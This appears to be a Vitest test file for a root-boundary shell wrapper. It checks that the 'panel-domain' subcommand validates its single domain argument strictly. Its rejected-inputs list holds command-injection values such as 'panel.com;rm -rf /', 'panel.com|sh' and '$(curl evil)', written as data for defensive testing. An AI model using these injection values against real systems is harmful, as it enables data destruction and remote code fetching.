import { spawnSync } from "node:child_process";
import { readFileSync } from "node:fs";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

// Repo-root pattern matches wrapper-support-bundle-args.test.ts.
const here = dirname(fileURLToPath(import.meta.url));
const WRAPPER = resolve(here, "../../../../../bin/vibe-panel-run");

const OP_ALLOWLIST_RE = /OP_ALLOWLIST="([^"]*)"/;
const WHITESPACE_RE = /\s+/;
const PD_ARITY_RE = /panel-domain takes exactly one domain argument/;
const PD_BIN_DIR_RE = /panel-domain bin dir/;
const PD_ILLEGAL_RE = /illegal characters/;
const PD_RESERVED_RE = /reserved\/test name/;
const PD_DASH_RE =
	/must not start or end with a dash|label starts or ends with a dash/;
const PD_NO_DOT_RE = /fully-qualified name with a dot/;

/**
 * Invoke the wrapper end-to-end (NOT as a lib). The validation guards we assert
 * run BEFORE any privileged action — with a nonexistent host dir the exec target
 * resolution fails closed anyway, but the arg/domain guards fire first.
 */
function runWrapper(args: string[]): { status: number; stderr: string } {
	const res = spawnSync("sh", [WRAPPER, ...args], {
		encoding: "utf8",
		env: { ...process.env, PANEL_HOST_DIR: "/nonexistent-vibe-host" },
	});
	return { status: res.status ?? -1, stderr: res.stderr ?? "" };
}

describe("vibe-panel-run — panel-domain subcommand: arity", () => {
	it("requires exactly one arg (zero rejected)", () => {
		const res = runWrapper(["panel-domain"]);
		expect(res.status).toBe(1);
		expect(res.stderr).toMatch(PD_ARITY_RE);
	});

	it("rejects more than one arg", () => {
		const res = runWrapper(["panel-domain", "panel.a.com", "extra"]);
		expect(res.status).toBe(1);
		expect(res.stderr).toMatch(PD_ARITY_RE);
	});
});

describe("vibe-panel-run — panel-domain subcommand: strict domain validation (root boundary)", () => {
	// Injection + malformed vectors must ALL die at the root boundary, never reach
	// assert_root_owned. The positive [a-z0-9.-] allowlist blocks every metachar.
	const rejected: [string, RegExp][] = [
		["panel.com {", PD_ILLEGAL_RE],
		["panel.com;rm -rf /", PD_ILLEGAL_RE],
		["panel.com|sh", PD_ILLEGAL_RE],
		["panel.com&whoami", PD_ILLEGAL_RE],
		["$(curl evil)", PD_ILLEGAL_RE],
		["`whoami`.com", PD_ILLEGAL_RE],
		["panel.com/admin", PD_ILLEGAL_RE],
		["panel.com:8443", PD_ILLEGAL_RE],
		["Panel.com", PD_ILLEGAL_RE],
		["panel_underscore.com", PD_ILLEGAL_RE],
		["panel.*.com", PD_ILLEGAL_RE],
		// localhost has no dot, so it dies on the FQDN guard before the reserved check.
		["localhost", PD_NO_DOT_RE],
		["panel.test", PD_RESERVED_RE],
		["panel.invalid", PD_RESERVED_RE],
		["panel.example.com", PD_RESERVED_RE],
		["-panel.com", PD_DASH_RE],
		["panel-.com", PD_DASH_RE],
	];
	for (const [domain, re] of rejected) {
		it(`rejects ${JSON.stringify(domain)} at the root boundary`, () => {
			const res = runWrapper(["panel-domain", domain]);
			expect(res.status).toBe(1);
			expect(res.stderr).toMatch(re);
			// It must NEVER have advanced to the exec-target ownership check.
			expect(res.stderr).not.toMatch(PD_BIN_DIR_RE);
		});
	}

	it("a VALID domain passes validation and reaches the root-owned guard", () => {
		// With a valid domain the arity + strict validation pass, so it advances to
		// assert_root_owned against the (nonexistent) panel bin dir, proving we are
		// on the panel-domain branch and the domain was accepted.
		const res = runWrapper(["panel-domain", "panel.mysite.com"]);
		expect(res.status).toBe(1);
		expect(res.stderr).toMatch(PD_BIN_DIR_RE);
	});
});

describe("vibe-panel-run — panel-domain is NOT in OP_ALLOWLIST", () => {
	it("is its own top-level subcommand, not a per-site op", () => {
		const src = readFileSync(WRAPPER, "utf8");
		const tokens = (src.match(OP_ALLOWLIST_RE)?.[1] ?? "").split(WHITESPACE_RE);
		expect(tokens).not.toContain("panel-domain");
	});
});
